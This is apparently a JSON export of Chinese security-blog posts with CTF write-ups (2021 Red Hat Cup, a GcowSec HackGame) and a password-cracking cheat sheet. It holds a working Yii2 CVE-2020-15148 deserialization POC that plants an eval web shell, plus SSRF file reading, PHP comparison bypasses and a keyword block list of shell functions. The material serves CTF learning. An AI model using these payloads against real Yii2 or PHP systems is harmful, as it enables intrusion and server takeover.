[{"title":"2021红帽杯","date":"2021-05-14T02:15:30.000Z","path":"2021-05-14-2021红帽杯.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><h3 id=\"web1\"><a href=\"#web1\" class=\"headerlink\" title=\"web1\"></a>web1</h3><p>备份文件</p><p><img src=\"../img/image-20210509122754063.png\" alt=\"image-20210509122754063\">)<img src=\"../img/image-20210509122814932.png\" alt=\"image-20210509122814932\"></p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Really easy...</span></span><br><span class=\"line\"></span><br><span class=\"line\">$file=fopen(<span class=\"string\">\"flag.php\"</span>,<span class=\"string\">\"r\"</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"Unable 2 open!\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(<span class=\"string\">\"flag.php\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$hack=fopen(<span class=\"string\">\"hack.php\"</span>,<span class=\"string\">\"w\"</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"Unable 2 open\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">$a=$_GET[<span class=\"string\">'code'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span>,$a))&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">\"you die\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(strlen($a)&gt;<span class=\"number\">33</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">die</span>(<span class=\"string\">\"nonono.\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">fwrite($hack,$a);</span><br><span class=\"line\">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class=\"line\"></span><br><span class=\"line\">fclose($file);</span><br><span class=\"line\">fclose($hack);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><p>根据提示，上个phpinfo();</p><p><img src=\"../img/image-20210509122836923.png\" alt=\"image-20210509122836923\"></p><p><img src=\"../img/image-20210509122737541.png\" alt=\"image-20210509122737541\"></p><p>​ flag{38e69165-0f27-4b44-b878-4fea5433893f}</p><h3 id=\"web-2\"><a href=\"#web-2\" class=\"headerlink\" title=\"web 2\"></a>web 2</h3><p>在vendor\\yiisoft\\yii2\\BaseYii.php处获得版本信息yii版本为2.0.32，查看资料存在CVE-2020-15148 反序列化漏洞</p><p><img src=\"../img/image-20210509182009671.png\" alt=\"image-20210509182009671\"></p><p>看到controllers\\SiteController.php存在反序列化入口</p><p><img src=\"../img/image-20210509182233053.png\" alt=\"image-20210509182233053\"></p><p>确定路由和方法为r=site/about，传入参数为message【具体为啥自行百度漏洞原理】</p><p>具体利用链为</p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yii\\db\\BatchQueryResult::__destruct() -&gt; Faker\\Generator::__call() -&gt; yii\\rest\\IndexAction::run()</span><br></pre></td></tr></table></figure><p>构造POC如下，发现存在函数拦截，所以写了shell进去</p><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">yii</span>\\<span class=\"title\">rest</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">class</span> <span class=\"title\">CreateAction</span>&#123;</span><br><span class=\"line\">        <span class=\"title\">public</span> $<span class=\"title\">checkAccess</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $id;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;checkAccess = <span class=\"string\">'assert'</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;id = <span class=\"string\">\"file_put_contents('a.php','&lt;?=eval(\\$_POST[1]);')\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Faker</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">yii</span>\\<span class=\"title\">rest</span>\\<span class=\"title\">CreateAction</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Generator</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">protected</span> $formatters;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;formatters[<span class=\"string\">'close'</span>] = [<span class=\"keyword\">new</span> CreateAction(), <span class=\"string\">'run'</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">yii</span>\\<span class=\"title\">db</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">use</span> <span class=\"title\">Faker</span>\\<span class=\"title\">Generator</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BatchQueryResult</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> $_dataReader;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;_dataReader = <span class=\"keyword\">new</span> Generator;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">    <span class=\"title\">echo</span> <span class=\"title\">base64_encode</span>(<span class=\"title\">serialize</span>(<span class=\"title\">new</span> <span class=\"title\">yii</span>\\<span class=\"title\">db</span>\\<span class=\"title\">BatchQueryResult</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成反序列字符串</p><p><img src=\"../img/image-20210509154950778.png\" alt=\"image-20210509154950778\"></p><p>写入</p><p><img src=\"../img/image-20210509155013424.png\" alt=\"image-20210509155013424\"></p><p>蚁剑连接，绕过disable_functions(从phpinfo获得disable_functions)</p><p><img src=\"../img/image-20210509152936794.png\" alt=\"image-20210509152936794\"></p><p><img src=\"../img/image-20210509152748092.png\" alt=\"image-20210509152748092\"></p><p>得到flag</p><p><img src=\"../img/image-20210509152811322.png\" alt=\"image-20210509152811322\"></p><p>flag{5db6abb9-677a-4c0f-9a35-8d00e56c2de5}</p><h3 id=\"web-3\"><a href=\"#web-3\" class=\"headerlink\" title=\"web 3\"></a>web 3</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">|</span><br><span class=\"line\">and</span><br><span class=\"line\">union</span><br><span class=\"line\">%20</span><br><span class=\"line\">//</span><br><span class=\"line\">--</span><br><span class=\"line\">-</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">limit</span><br></pre></td></tr></table></figure><p>扫描到modify.php文件</p><p><img src=\"../img/image-20210509125007063.png\" alt=\"image-20210509125007063\"></p><p>看页面，猜测存在sssrf</p><p><img src=\"../img/image-20210509125159352.png\" alt=\"image-20210509125159352\"></p><p>看到”Your host has something wrong”，猜测参数是host，测试host=<a href=\"http://127.0.0.1，成功\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1，成功</a></p><p><img src=\"../img/image-20210509125336257.png\" alt=\"image-20210509125336257\"></p><p>ssrf读文件，得到flag</p><p><img src=\"../img/image-20210509124949689.png\" alt=\"image-20210509124949689\"></p><p>flag{3976b401-3920-4e09-b7f7-8247e829ba55}</p><h3 id=\"web-4【未完成】\"><a href=\"#web-4【未完成】\" class=\"headerlink\" title=\"web 4【未完成】\"></a>web 4【未完成】</h3><p>ssrf有拓展名的白名单</p><p><img src=\"../img/image-20210509163128226.png\" alt=\"image-20210509163128226\"></p><h3 id=\"MISC-1-Crypto-primegame\"><a href=\"#MISC-1-Crypto-primegame\" class=\"headerlink\" title=\"MISC 1 Crypto - primegame\"></a>MISC 1 Crypto - primegame</h3><p>找到了类似的题目<br><a href=\"https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/\" target=\"_blank\" rel=\"noopener\">https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/</a></p><p>根据类似题目构造解密脚本，并重命名为 XXX.sage 后缀。<br>脚本中ct值为out文件数据。</p><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"><span class=\"keyword\">from</span> decimal <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">getcontext().prec = int(<span class=\"number\">100</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">primes = [<span class=\"number\">2</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>, <span class=\"number\">100</span>):</span><br><span class=\"line\">    f = <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> primes:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i * i &lt; j:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i % j == <span class=\"number\">0</span>:</span><br><span class=\"line\">            f = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> f:</span><br><span class=\"line\">        primes.append(i)</span><br><span class=\"line\"></span><br><span class=\"line\">keys = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(primes)):</span><br><span class=\"line\">    keys.append(Decimal(int(primes[i])).ln())</span><br><span class=\"line\"></span><br><span class=\"line\">arr = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">    arr.append(int(v * int(<span class=\"number\">16</span>) ** int(<span class=\"number\">64</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ct值为out文件的数据</span></span><br><span class=\"line\">ct = <span class=\"number\">597952043660446249020184773232983974017780255881942379044454676980646417087515453</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(res)</span>:</span></span><br><span class=\"line\">    h = Decimal(int(<span class=\"number\">0</span>))</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(keys)):</span><br><span class=\"line\">        h += res[i] * keys[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    ct = int(h * int(<span class=\"number\">16</span>)**int(<span class=\"number\">64</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ct</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f</span><span class=\"params\">(N)</span>:</span></span><br><span class=\"line\">    ln = len(arr)</span><br><span class=\"line\">    A = Matrix(ZZ, ln + <span class=\"number\">1</span>, ln + <span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(ln):</span><br><span class=\"line\">        A[i, i] = <span class=\"number\">1</span></span><br><span class=\"line\">        A[i, ln] = arr[i] // N</span><br><span class=\"line\">        A[ln, i] = <span class=\"number\">64</span></span><br><span class=\"line\"></span><br><span class=\"line\">    A[ln, ln] = ct // N</span><br><span class=\"line\"></span><br><span class=\"line\">    res = A.LLL()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(ln + <span class=\"number\">1</span>):</span><br><span class=\"line\">        flag = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(ln):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"number\">-64</span> &lt;= res[i][j] &lt; <span class=\"number\">64</span>:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            flag = <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">            vec = [int(v + <span class=\"number\">64</span>) <span class=\"keyword\">for</span> v <span class=\"keyword\">in</span> res[i][:<span class=\"number\">-1</span>]]</span><br><span class=\"line\">            ret = encrypt(vec)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ret == ct:</span><br><span class=\"line\">                print(N, bytes(vec))</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">\"NO\"</span>, ret, bytes(vec))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">2</span>, <span class=\"number\">10000</span>):</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">    f(i)</span><br></pre></td></tr></table></figure><p>安装<a href=\"https://www.sagemath.org/download.html\" target=\"_blank\" rel=\"noopener\">SageMath</a>工具</p><p>运行 XXX.sage 解密脚本</p><p>将代码ct的值更换为out文件的另一个数据<br>再次运行 XXX.sage 解密脚本</p><p><img src=\"../img/image-20210509171438751.png\" alt=\"image-20210509171438751\"></p><p><img src=\"../img/image-20210509172712371.png\" alt=\"image-20210509172712371\"></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&apos;flag&#123;715c39c3-1b46-4c23-8006-27b43eba2446&#125;&apos;</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->","excerpt":"","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://ll-mf.github.io/tags/CTF/"}]},{"title":"Overview","date":"2020-10-15T02:17:23.000Z","path":"2020-10-15-Overview.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p>各种内容的总和，细节较少，用于速查知识点</p><a id=\"more\"></a><h1 id=\"密码破解\"><a href=\"#密码破解\" class=\"headerlink\" title=\"密码破解\"></a>密码破解</h1><h2 id=\"PDF\"><a href=\"#PDF\" class=\"headerlink\" title=\"PDF\"></a>PDF</h2><blockquote><p><strong>PDF密码</strong>：PDF加密有两种分别是<strong>所有者密码</strong>(编辑权限密码)和<strong>用户密码</strong>(打开密码)<br><strong>所有者密码</strong>(编辑权限密码)是用来限制用户复制，编辑和打印PDF的密码，可以通过PDF_Password_Remover等软件进行移除<br><strong>用户密码</strong>(打开密码)用来限制用户打开或者浏览PDF文件的密码，仅能通过暴力破解进行破解</p></blockquote><p><strong>破解PDF用户密码</strong><br>pdfcrack是破解PDF用户密码(打开密码)的Linux命令行工具。</p><p>安装</p><pre><code class=\"bash\"><span class=\"comment\"># apt-get install pdfcrack</span></code></pre><p>使用方法</p><pre><code class=\"bash\"><span class=\"comment\"># pdfcrack -f filename.pdf -n 6 -m 8 -c 0123456789</span></code></pre><p>参数解释：</p><ul><li>-n：密码最短多少个字符</li><li>-m：密码最长多少个字符</li><li>-c：使用的字符集</li></ul><p>使用密码字典</p><pre><code class=\"bash\"><span class=\"comment\"># pdfcrack -f high.pdf -w wordlist.txt</span></code></pre><p><strong>破解PDF所有者密码</strong></p><p>PDF_Password_Remover是移除限制文件编辑和打印的密码的软件<br>直接通过该软件对所有者密码进行移除即可</p><hr><h2 id=\"压缩文件\"><a href=\"#压缩文件\" class=\"headerlink\" title=\"压缩文件\"></a>压缩文件</h2><p>针对例如ZIP、RAR等常见压缩文件的破解方案</p><h3 id=\"crc32爆破\"><a href=\"#crc32爆破\" class=\"headerlink\" title=\"crc32爆破\"></a>crc32爆破</h3><p>压缩包压缩文件会附带crc32校验码，如果字节长度比较短的话，可以尝试crc32爆破。</p><pre><code class=\"py\"><span class=\"comment\"># 该例子为压缩包内容为3bytes-4bytes时</span>\n<span class=\"keyword\">import</span> binascii\n\ncrc = <span class=\"number\">0x884863d2</span>\n\n<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">100</span>, <span class=\"number\">1000</span> + <span class=\"number\">1</span>):\n    <span class=\"keyword\">if</span> (binascii.crc32(str(i)) &amp; <span class=\"number\">0xffffffff</span>) == crc:\n        <span class=\"keyword\">print</span> i</code></pre><p>crc32.py可列举出6bytes所有可能的值</p><pre><code class=\"bash\">C:\\Users\\LLMF\\Downloads\\crc32-master\\crc32-master&gt;python3 crc32.py reverse 0x9c4d9a5d\n4 bytes: {0x52, 0x69, 0xd6, 0x21}\nverification checksum: 0x9c4d9a5d (OK)\nalternative: 3oTbiI (OK)\nalternative: 954288 (OK)\nalternative: GvfvQf (OK)\n···\nalternative: vT00lu (OK)</code></pre><h3 id=\"Zip\"><a href=\"#Zip\" class=\"headerlink\" title=\"Zip\"></a>Zip</h3><p>1.伪加密</p><ul><li><p>用7z压缩软件可直接打开 或者使用<code>binwalk -e</code>分离</p></li><li><p>使用ZipCenOp.jar<br><code>java -jar ZipCenOp.jar r xxx.zip</code></p></li><li><p>用16进制编辑器修改加密标记位<br><img src=\"img/hexo-2020-10-17-14-06-41.png\" alt><br>如上图，修改加密标记位为00，保存，即可打开压缩包(关于zip文件的结构，请另外翻阅资料)</p></li></ul><p>2.已知明文攻击</p><p>使用ARCHPR即可</p><!-- rebuild by neat -->","excerpt":"各种内容的总和，细节较少，用于速查知识点","categories":[],"tags":[]},{"title":"HackGame-writeup","date":"2020-08-07T09:32:32.000Z","path":"2020-08-07-HackGame-writeup.html","content":"<!-- build time:Fri May 14 2021 10:58:02 GMT+0800 (GMT+08:00) --><p><img src=\"../img/hexo-2020-08-07-17-35-44.png\" alt></p><a id=\"more\"></a><br><div align=\"right\"><div style=\"color:orange;color:#999;padding:2px\">Author:LLMF</div></div><hr><h1 id=\"Lv1-简单的题目\"><a href=\"#Lv1-简单的题目\" class=\"headerlink\" title=\"Lv1 简单的题目\"></a>Lv1 简单的题目</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=1\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=1</a></p></blockquote><p>题目提示base64<br><code>ZmxhZyU3QnRoaXMlMjBpcyUyMHNvJTIwZWFzeSU3RA</code></p><p>base64解码再URL解码即可</p><pre><code class=\"py\"><span class=\"keyword\">import</span> base64\n<span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse\ns = <span class=\"string\">'ZmxhZyU3QnRoaXMlMjBpcyUyMHNvJTIwZWFzeSU3RA=='</span> <span class=\"comment\">#补全==</span>\nflag = parse.unquote(str(base64.b64decode(s)))\nprint(flag)\n<span class=\"comment\">#b'flag{this is so easy}'</span></code></pre><hr><h1 id=\"Lv2-MD5\"><a href=\"#Lv2-MD5\" class=\"headerlink\" title=\"Lv2 MD5\"></a>Lv2 MD5</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=2\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=2</a></p></blockquote><p>题目提示MD5其实也没那么暴力，给出下列代码</p><pre><code class=\"php\"><span class=\"keyword\">if</span>(@md5($_GET[<span class=\"string\">'a'</span>]) == @md5($_GET[<span class=\"string\">'b'</span>]) <span class=\"keyword\">and</span> @$_GET[<span class=\"string\">'b'</span>]!=@$_GET[<span class=\"string\">'a'</span>]) { <span class=\"keyword\">echo</span> <span class=\"string\">\"flag{XXX}\"</span>; } /ctf/md5.php</code></pre><p>题目考察的是md5弱比较，为0e开头的会被识别为科学记数法，结果均为0</p><pre><code class=\"html\">http://ctf.gcowsec.com/ctf/md5.php?a=QNKCDZO&amp;b=aabg7XSs\n<span class=\"comment\">&lt;!--flag{what is it}--&gt;</span></code></pre><hr><h1 id=\"Lv3-SHA1\"><a href=\"#Lv3-SHA1\" class=\"headerlink\" title=\"Lv3 SHA1\"></a>Lv3 SHA1</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=2\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=2</a></p></blockquote><pre><code class=\"php\"><span class=\"comment\">//md5都有了那么我想</span>\n<span class=\"comment\">///ctf/sha1.php</span>\n\n<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'name'</span>]) <span class=\"keyword\">and</span> <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'password'</span>])) {\n    <span class=\"keyword\">if</span> ($_GET[<span class=\"string\">'name'</span>] == $_GET[<span class=\"string\">'password'</span>])\n        <span class=\"keyword\">echo</span> <span class=\"string\">'</span>\n<span class=\"string\"></span>\n<span class=\"string\">Your password can not be your name!</span>\n<span class=\"string\">'</span>;\n    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (sha1($_GET[<span class=\"string\">'name'</span>]) === sha1($_GET[<span class=\"string\">'password'</span>]))\n      <span class=\"keyword\">die</span>(<span class=\"string\">'Flag: '</span>);\n    <span class=\"keyword\">else</span>\n        <span class=\"keyword\">echo</span> <span class=\"string\">'</span>\n<span class=\"string\"></span>\n<span class=\"string\">Invalid password.</span>\n<span class=\"string\">'</span>;\n}\n<span class=\"keyword\">else</span>{\n    <span class=\"keyword\">echo</span> <span class=\"string\">'</span>\n<span class=\"string\"></span>\n<span class=\"string\">Login first!</span>\n<span class=\"string\">'</span>;\n    }\n</code></pre><p>题目考察的是数组绕过，sha1函数只能处理字符串</p><pre><code class=\"html\">http://ctf.gcowsec.com/ctf/sha1.php?name[]=1&amp;password[]=2\n<span class=\"comment\">&lt;!--flag{bad}--&gt;</span></code></pre><hr><h1 id=\"Lv4-搜索引擎\"><a href=\"#Lv4-搜索引擎\" class=\"headerlink\" title=\"Lv4 搜索引擎\"></a>Lv4 搜索引擎</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=4\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=4</a></p></blockquote><p>题目提示<br><code>你不知 我知 百度知之而不知 /ctf/</code></p><p>这道题考察的是robots.txt文件，robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的</p><pre><code class=\"html\">http://ctf.gcowsec.com/ctf/robots.txt\n<span class=\"comment\">&lt;!--</span>\n<span class=\"comment\">User-agent: *</span>\n<span class=\"comment\">Disallow:myphp.php</span>\n<span class=\"comment\">--&gt;</span>\n--- ---\nhttp://ctf.gcowsec.com/ctf/myphp.php\n<span class=\"comment\">&lt;!--flag{you is good}--&gt;</span></code></pre><hr><h1 id=\"Lv5-不可逆算法\"><a href=\"#Lv5-不可逆算法\" class=\"headerlink\" title=\"Lv5 不可逆算法\"></a>Lv5 不可逆算法</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=5\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=5</a></p></blockquote><p>题目提示<br>当没有提示 一种原始的密码学方法可能在向你招手 内容:08e16912bc372ae13558fbaea5743000<br>直接MD5解密即可</p><hr><h1 id=\"Lv6-计算机编码\"><a href=\"#Lv6-计算机编码\" class=\"headerlink\" title=\"Lv6 计算机编码\"></a>Lv6 计算机编码</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=6\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=6</a></p></blockquote><p>题目提示<br>来放松一下,这段数字没有任何意义上的加密 如果有兴趣就试试破解吧(跟编码有关 呸 我提示了很多了) 102 108 97 103 123 77 85 125</p><p>这道题考察的是简单的编码加解密，看起来就是ASCII码，查找对应代表的字符串即可<br>flag{MU}</p><hr><h1 id=\"Lv7-计算机编码\"><a href=\"#Lv7-计算机编码\" class=\"headerlink\" title=\"Lv7 计算机编码\"></a>Lv7 计算机编码</h1><blockquote><p><a href=\"http://ctf.gcowsec.com/index.php?index=7\" target=\"_blank\" rel=\"noopener\">http://ctf.gcowsec.com/index.php?index=7</a></p></blockquote><p>题目提示<br>简单一点 you can have to enter the password to access Lv7. 提交 /ctf/lv7.php?answer=答案 然后获取通过答案 